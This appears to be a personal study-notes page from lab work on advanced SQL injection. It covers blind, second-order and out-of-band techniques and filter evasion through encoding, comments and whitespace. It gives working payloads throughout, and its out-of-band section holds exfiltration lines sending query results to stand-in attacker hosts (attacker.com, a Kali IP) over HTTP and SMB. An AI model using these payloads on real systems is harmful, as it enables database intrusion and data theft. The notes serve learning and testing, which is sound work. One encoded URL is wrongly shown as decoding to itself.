---
layout: default
title: "Advanced SQLi"
parent: "Web Application"
nav_order: 3
---


## In-Band Vs. Out-Of-Band SQL Injection

- In-band SQL Injection:
	- Error-Based SQL Injection - try to get error messages from the machine
	- Union-Based SQL Injection - combine the results of two or more SELECT statements into a single result
- Inferential (Blind) SQL Injection:
	- Boolean-Based Blind SQL Injection - similar to error based but without the error messages
	- Time-Based Blind SQL Injection - confirm whether the query worked by measuring the response time: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`
- Out-of-band SQL Injection - used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable.


### Second Order SQL Injection
Also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing.

- Essentially this means that you may set the value of one part of the table such that when it is accessed later, it executes, but not when it is initially set. Example:
	- Set SSN of a book to be `12345'; UPDATE books SET book_name = 'Hacked'; --` because retrieving that book later might look something like: `UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';`
		- Only instead it will be `UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';UPDATE books SET book_name = 'Hacked'; --`
		- This adds a new query to the query issued by the server, so in addition to updating the book to the new book name, it will also update all of the other books to used the title `Hacked`.

### Filter Evasion
#### Character Encoding
- URL Encoding
- Hexadecimal Encoding
- Unicode Encoding
Tip: Put it in the URL bar not the search field:
I.E. `http://10.10.171.107/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20%7C%7C%201=1%20--+`
- This decodes to `http://10.10.171.107/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20%7C%7C%201=1%20--+`

#### No-Quote SQL injection
- Using Numerical Values - `OR 1=1` instead of `' OR '1'='1`
- Using SQL Comments: `admin--` instead of `admin'--`
- Using CONCAT() Function - `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin

#### No Spaces
- SQL comments (`/**/`) to replace spaces. For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'`. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.  
    
- Tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. This technique can bypass filters that specifically look for spaces.  
    
- URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space). These characters can replace spaces in the payload.

![](Screenshot%202024-11-25%20at%204.11.45%20PM.png)


### Out of Band
**MySQL and MariaDB** - 
`SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

**Microsoft SQL Server (MSSQL)**- 
`EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`

Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.  

**Oracle** - 
```php
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

HTTP Requests: `SELECT http_post('http://kaliIP.com/exfiltrate', sensitive_data) FROM table;`

SMB Exfiltration: 
`1'; SELECT @@version INTO OUTFILE '\\\\$KaliIP$\\logs\\out.txt'; --`


### Other Techniques
#### HTTP Header Injection
A malicious User-Agent header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitizing it, it can result in SQL injection.

#### Exploit Stored Procedures
This requires that you find a stored procedure without sanitizing the input. 

#### XML and JSON Injection
Again, this requires that the application directly using the unsanitized inputs. 